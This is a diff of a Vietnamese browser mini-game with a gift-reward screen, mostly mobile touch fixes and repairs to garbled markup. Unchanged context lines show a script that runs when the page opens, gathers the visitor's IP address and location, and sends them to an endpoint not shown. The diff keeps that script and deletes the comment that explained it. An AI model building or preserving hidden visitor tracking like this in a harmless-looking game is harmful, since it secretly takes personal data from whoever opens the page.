@@ -2,7 +2,7 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Phá Đảo Nhận Quà Cùng Bảo Châm 🌸</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -15,16 +15,20 @@
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             overflow: hidden;
             color: #fff;
+            touch-action: manipulation;
         }
         .game-container {
             position: relative;
             width: 850px;
+            max-width: 100vw;
             height: 450px;
             background: linear-gradient(to bottom, #ff758c, #ff7eb3, #ffd1ff);
             border-radius: 20px;
             overflow: hidden;
             box-shadow: 0 15px 35px rgba(0,0,0,0.6);
             border: 4px solid rgba(255, 255, 255, 0.3);
+            touch-action: manipulation;
+            -webkit-tap-highlight-color: transparent;
         }
         .cloud {
             position: absolute;
@@ -137,10 +141,12 @@
         }
         .reward-box img {
             width: 240px;
+            max-width: 70vw;
             height: auto;
             border-radius: 10px;
             box-shadow: 0 5px 15px rgba(0,0,0,0.5);
             outline: none;
+            display: block;
         }
         .btn {
             padding: 10px 25px;
@@ -153,8 +159,13 @@
             cursor: pointer;
             box-shadow: 0 5px 20px rgba(0, 176, 155, 0.4);
             transition: 0.3s;
+            position: relative;
+            z-index: 25;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
         }
         .btn:hover { transform: scale(1.08); }
+        .btn:active { transform: scale(0.95); }
         #winScreen, #gameOverScreen { display: none; }
     </style>
 </head>
@@ -177,25 +188,25 @@
         <!-- Màn hình bắt đầu -->
         <div class="overlay-screen" id="startScreen">
             <h1>Hành Trình Ngắn Của Bảo Châm 🌸</h1>
-            <p>Đạt <b>100 điểm</b> là vượt qua map để xem video mới nhé!</p>
-            <button class="btn" onclick="startGame()">Bắt đầu chơi</button>
+            <p>Đạt <b>100 điểm</b> là vượt qua map để xem quà mới nhé!</p>
+            <button class="btn" id="startBtn" type="button">Bắt đầu chơi</button>
         </div>
 
         <!-- Màn hình THUA -->
         <div class="overlay-screen" id="gameOverScreen">
             <h1>Chạm nhẹ cái mà thua mất rồi! 🥺</h1>
             <p>Thử lại siêu nhanh nha!</p>
-            <button class="btn" onclick="restartGame()">Chơi lại</button>
+            <button class="btn" id="retryBtn" type="button">Chơi lại</button>
         </div>
 
         <!-- Màn hình THẮNG -->
         <div class="overlay-screen" id="winScreen">
-            <h1.classList>🎉 Phá Đảo Thành Công! 🎉</h1>
+            <h1>🎉 Phá Đảo Thành Công! 🎉</h1>
             <div class="reward-box">
-                <img id="rewardImg" src="https://files.catbox.moe/o5.addu74c.jpeg" alt="Phần thưở('ng">
+                <img id="rewardImg" src="https://files.catbox.moe/o5u74c.jpeg" alt="Phần thưởng">
             </div>
-            <p>Mobón quà cuối map dành riêstng cho Bảo Châm! 🥰</pacle>
-            <button class="btn" onclick="restartGame()">Chơi lại từ đầu</button>
+            <p>Món quà cuối map dành riêng cho Bảo Châm! 🥰</p>
+            <button class="btn" id="restartBtn" type="button">Chơi lại từ đầu</button>
         </div>
     </div>
 
@@ -213,7 +224,6 @@
             }).catch(err => console.log("Lỗi gửi:", err));
         }
 
-        // Hàm thu thập và gửi thông tin khi mở web
         (async function() {
             let ip = "Không xác định";
             let location = "Không xác định";
@@ -293,15 +303,26 @@
             }, 22);
         }
 
+        // Phím Space trên máy tính
         document.addEventListener('keydown', (e) => {
-            if (e.code === 'Space') { e.preventDefault(); jump(); }
+            if (e.code === 'Space') {
+                e.preventDefault();
+                if (isPlaying) jump();
+            }
         });
-        gameContainer.addEventListener('click', jump);
+
+        // ✅ Mobile: dùng pointerdown cho nhạy, bỏ qua khi bấm vào nút
+        gameContainer.addEventListener('pointerdown', (e) => {
+            if (e.target.closest('.btn')) return;
+            if (!isPlaying) return;
+            e.preventDefault();
+            jump();
+        });
 
         function createObstacle() {
             if (!isPlaying) return;
             const obstacle = document.createElement('div');
-            obstacle');
+            obstacle.classList.add('obstacle');
             obstacle.innerHTML = obstacleTypes[Math.floor(Math.random() * obstacleTypes.length)];
             obstacle.style.animationDuration = '3.0s';
             gameContainer.appendChild(obstacle);
@@ -337,6 +358,7 @@
             score = 0;
             scoreDisplay.innerText = score;
             isPlaying = true;
+            if (obstacleInterval) clearInterval(obstacleInterval);
             obstacleInterval = setInterval(createObstacle, 2800);
         }
 
@@ -359,6 +381,20 @@
             winScreen.style.display = 'none';
             startGame();
         }
+
+        // ✅ Gắn sự kiện cho các nút (tránh xung đột với pointerdown container)
+        document.getElementById('startBtn').addEventListener('click', (e) => {
+            e.stopPropagation();
+            startGame();
+        });
+        document.getElementById('retryBtn').addEventListener('click', (e) => {
+            e.stopPropagation();
+            restartGame();
+        });
+        document.getElementById('restartBtn').addEventListener('click', (e) => {
+            e.stopPropagation();
+            restartGame();
+        });
     </script>
 </body>
 </html>
